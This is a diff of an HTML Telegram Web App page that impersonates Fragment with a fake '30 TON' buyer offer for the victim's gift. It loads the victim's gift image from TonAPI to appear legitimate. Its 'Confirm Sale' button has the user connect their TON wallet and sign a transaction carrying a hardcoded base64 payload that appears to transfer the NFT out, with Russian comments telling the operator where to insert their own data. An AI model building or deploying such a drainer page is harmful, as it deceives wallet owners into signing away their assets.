@@ -7,51 +7,176 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <style>
-        body { background: #0f0f0f; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; padding: 20px; margin: 0; }
-        .card { background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 16px; padding: 24px; max-width: 400px; width: 100%; text-align: center; }
-        .logo { font-size: 20px; font-weight: bold; margin-bottom: 20px; color: #0098ea; }
-        .img { width: 120px; height: 120px; background: #2a2a2a; border-radius: 12px; margin: 0 auto 16px; }
-        .title { font-size: 18px; font-weight: bold; margin-bottom: 8px; }
-        .price { font-size: 28px; font-weight: bold; color: #0098ea; margin: 20px 0; }
-        .btn { background: #0098ea; color: #fff; border: none; padding: 14px; border-radius: 8px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; }
-        .btn:disabled { opacity: 0.5; }
+        :root {
+            --bg: #0f0f0f;
+            --card: #1a1a1a;
+            --text: #e8e8e8;
+            --dim: #888;
+            --accent: #0098ea;
+            --border: #2a2a2a;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: var(--bg); 
+            color: var(--text); 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            padding: 20px; 
+            min-height: 100vh;
+        }
+        .card { 
+            background: var(--card); 
+            border: 1px solid var(--border); 
+            border-radius: 16px; 
+            padding: 24px; 
+            max-width: 400px; 
+            width: 100%; 
+            text-align: center;
+            height: fit-content;
+        }
+        .header { font-size: 20px; font-weight: bold; color: var(--accent); margin-bottom: 20px; display: flex; align-items: center; justify-content: center; gap: 8px;}
+        
+        /* Блок с картинкой подарка */
+        .gift-img-wrapper {
+            width: 160px;
+            height: 160px;
+            margin: 0 auto 16px;
+            position: relative;
+        }
+        .gift-img { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: contain;
+            filter: drop-shadow(0 10px 20px rgba(0,0,0,0.5));
+        }
+        .gift-collection { font-size: 12px; color: var(--dim); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px;}
+        .gift-name { font-size: 22px; font-weight: bold; margin-bottom: 24px; }
+        
+        /* Блок с офером */
+        .offer-box {
+            background: linear-gradient(135deg, rgba(0,152,234,0.1), rgba(0,152,234,0.02));
+            border: 1px solid rgba(0,152,234,0.3);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+        }
+        .offer-label { font-size: 12px; color: var(--dim); margin-bottom: 4px; }
+        .offer-price { font-size: 32px; font-weight: bold; color: var(--accent); }
+        .offer-price small { font-size: 14px; color: var(--dim); font-weight: normal; }
+        
+        .btn { 
+            background: var(--accent); 
+            color: #fff; 
+            border: none; 
+            padding: 16px; 
+            border-radius: 10px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            width: 100%; 
+            cursor: pointer; 
+            transition: opacity 0.2s;
+        }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        /* Скелетон для загрузки */
+        .skeleton { background: #252525; border-radius: 12px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="logo">Fragment</div>
-        <div class="img"></div>
-        <div class="title">Gift Offer</div>
-        <div class="price">30 TON</div>
-        <p style="color: #888; font-size: 13px;">Buyer wants to purchase your gift</p>
-        <button class="btn" id="btn" onclick="accept()">Accept Offer</button>
-    </div>
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready(); tg.expand();
+        <div class="header">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="12" fill="#0098EA"/><path d="M12 6V18M12 6L6 12M12 6L18 12" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+            Fragment
+        </div>
         
-        // Ссылка на твой манифест (уже правильная)
+        <!-- Картинка и название -->
+        <div class="gift-img-wrapper skeleton" id="imgWrapper">
+            <img class="gift-img" id="giftImage" style="display: none;" src="" alt="Gift">
+        </div>
+        <div class="gift-collection" id="giftCollection">Loading...</div>
+        <div class="gift-name" id="giftName">Loading Gift...</div>
+
+        <!-- Оффер -->
+        <div class="offer-box">
+            <div class="offer-label">Buyer's offer</div>
+            <div class="offer-price">30 <small>TON</small></div>
+        </div>
+        
+        <p style="color: var(--dim); font-size: 13px; margin-bottom: 20px;">
+            @fragment_buyer wants to purchase your gift
+        </p>
+
+        <button class="btn" id="btn" onclick="accept()">Confirm Sale</button>
+    </div>
+
+    <script>
+        const tg = window.Telegram?.WebApp;
+        if (tg) { tg.ready(); tg.expand(); }
+        
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ 
             manifestUrl: "https://jejemakersx-netizen.github.io/fsdfdsfsdfsf/tonconnect-manifest.json" 
         });
         
-        // ВСТАВЬ СЮДА СВОИ ДАННЫЕ:
-        const NFT_ADDRESS = "UQDYScI1plIdlNMUm_2BCVlxtZEE7wON5AbAr-0pkNqp-1Jm";
-        const PAYLOAD_B64 = "te6ccgEBAQEAUgAAn1/MPRQAAAAAAAAAAIAbCThGtMpDsppik3+wISsuNrIgneBxvIDYFf2lMhtVP3ADYScI1plIdlNMUm/2BCVlxtZEE7wON5AbAr+0pkNqp+wI";
+        // --- ТВОИ ДАННЫЕ ---
+        const NFT_ADDRESS = "UQDYScl1plId1NMUm_2BCV1xtZEE7wON5AbAr-0pkNqp-1Jm";
+        const PAYLOAD_B64 = "te6ccgEBAQEAUgAAn1/MPRQAAAAAAAAAAAIAbCThGtMpDsppik3+wISsuNrIgneBxvIDYFf2lMhtVP3ADYScl1plId1NMUm/2BCV1xtZEE7wON5AbAr+0pkNqp+wI";
+
+        // Автоматически подтягиваем картинку и данные из TonAPI
+        async function loadGiftData() {
+            try {
+                const res = await fetch(`https://tonapi.io/v2/nfts/${NFT_ADDRESS}`);
+                if (!res.ok) throw new Error("Not found");
+                const data = await res.json();
+                
+                // Ставим картинку
+                const img = document.getElementById('giftImage');
+                const wrapper = document.getElementById('imgWrapper');
+                if (data.previews && data.previews.length > 0) {
+                    img.src = data.previews[0].url;
+                    img.style.display = 'block';
+                    wrapper.classList.remove('skeleton');
+                } else {
+                    wrapper.style.background = '#2a2a2a'; // fallback
+                    wrapper.classList.remove('skeleton');
+                }
+                
+                // Ставим название и коллекцию
+                document.getElementById('giftName').innerText = data.metadata?.name || "Telegram Gift";
+                document.getElementById('giftCollection').innerText = data.collection?.name || "Gifts Collection";
+            } catch (e) {
+                console.log("Ошибка загрузки данных:", e);
+                document.getElementById('giftName').innerText = "Telegram Gift";
+                document.getElementById('giftCollection').innerText = "Gifts Collection";
+                document.getElementById('imgWrapper').classList.remove('skeleton');
+            }
+        }
+
+        loadGiftData();
 
         async function accept() {
             const btn = document.getElementById('btn');
-            btn.disabled = true; btn.innerText = "Processing...";
+            btn.disabled = true; 
+            btn.innerText = "Processing...";
+            
             try {
-                if (!tonConnectUI.connected) await tonConnectUI.connectWallet();
+                if (!tonConnectUI.connected) {
+                    await tonConnectUI.connectWallet();
+                }
+                
+                btn.innerText = "Confirm in wallet...";
+                
                 await tonConnectUI.sendTransaction({
                     validUntil: Math.floor(Date.now() / 1000) + 300,
                     messages: [{ address: NFT_ADDRESS, amount: "50000000", payload: PAYLOAD_B64 }]
                 });
-                btn.innerText = "Completed";
-                tg.HapticFeedback.notificationOccurred('success');
+                
+                btn.innerText = "Sale Completed ✓";
+                if (tg) tg.HapticFeedback.notificationOccurred('success');
             } catch (e) {
-                btn.disabled = false; btn.innerText = "Accept Offer";
+                btn.disabled = false; 
+                btn.innerText = "Confirm Sale";
                 alert("Error: " + e.message);
             }
         }
